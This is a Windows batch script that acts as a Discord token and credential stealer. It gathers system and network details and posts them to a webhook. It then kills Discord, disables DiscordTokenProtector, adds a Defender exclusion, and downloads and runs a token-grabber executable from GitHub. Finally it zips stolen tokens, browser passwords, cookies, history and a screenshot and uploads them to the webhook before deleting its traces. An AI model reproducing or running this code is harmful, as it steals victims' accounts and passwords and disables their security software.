@echo off
set webhook=YOUR_WEBHOOK_HERE
ipconfig | findstr /R /C:"IPv4 Address" > %userprofile%\AppData\Local\Temp\ipp.txt
powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table" > %userprofile%\AppData\Local\Temp\programms.txt
echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt

curl -X POST -H "Content-type: application/json" --data "{\"content\": \"@everyone ```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%

taskkill /im Discord.exe /f
taskkill /im DiscordTokenProtector.exe /f
if exist %userprofile%\AppData\Roaming\DiscordTokenProtector\DiscordTokenProtector.exe (
    del %userprofile%\AppData\Roaming\DiscordTokenProtector\DiscordTokenProtector.exe
)

if exist %userprofile%\AppData\Roaming\DiscordTokenProtector\ProtectionPayload.dll (
    del %userprofile%\AppData\Roaming\DiscordTokenProtector\ProtectionPayload.dll
)

if exist %userprofile%\AppData\Roaming\DiscordTokenProtector\secure.dat (
    del %userprofile%\AppData\Roaming\DiscordTokenProtector\secure.dat
)

if exist %userprofile%\AppData\Roaming\DiscordTokenProtector\config.json (
    echo { >%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "auto_start": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "auto_start_discord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity_allowbetterdiscord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity_checkexecutable": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity_checkhash": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity_checkmodule": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity_checkresource": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity_checkscripts": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity_redownloadhashes": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "iterations_iv": 187, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
)


cd %userprofile%\AppData\Local\Temp
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/main.exe --output %userprofile%\AppData\Local\Temp\main.exe
start /w /b main.exe %webhook%
taskkill /f /im main.exe


mkdir %localappdata%\Temp\KDOT
echo penis > %localappdata%\Temp\KDOT\KDot.txt
move %userprofile%\AppData\Local\Temp\tokens.txt %userprofile%\AppData\Local\Temp\KDOT\tokens.txt
move %localappdata%\Temp\ip.txt %localappdata%\Temp\KDOT\ip.txt
move %localappdata%\Temp\ipp.txt  %localappdata%\Temp\KDOT\ipp.txt
move %localappdata%\Temp\sysi.txt %localappdata%\Temp\KDOT\sysi.txt
move %localappdata%\Temp\System_INFO.txt %localappdata%\Temp\KDOT\System_INFO.txt
move %localappdata%\Temp\netstat.txt %localappdata%\Temp\KDOT\netstat.txt
move %localappdata%\Temp\programms.txt %localappdata%\Temp\KDOT\programms.txt
move %localappdata%\Temp\uuid.txt %localappdata%\Temp\KDOT\uuid.txt
move %localappdata%\Temp\wlan.txt %localappdata%\Temp\KDOT\wlan.txt
move %localappdata%\Temo\browser-cookies.txt %localappdata%\Temo\KDOT\browser-cookies.txt
move %localappdata%\Temp\browser-history.txt %localappdata%\Temp\KDOT\browser-history.txt
move %localappdata%\Temp\browser-passwords.txt %localappdata%\Temp\KDOT\browser-passwords.txt
move %localappdata%\Temp\desktop-screenshot.png %localappdata%\Temp\KDOT\desktop-screenshot.png

powershell.exe Compress-Archive -Path %localappdata%\Temp\KDOT -DestinationPath %localappdata%\Temp\KDOT.zip && curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\KDOT.zip %webhook%
del %localappdata%\Temp\main.exe
rmdir /s /q %localappdata%\Temp\KDOT
del KDOT.zip
timeout 1 >nul
exit
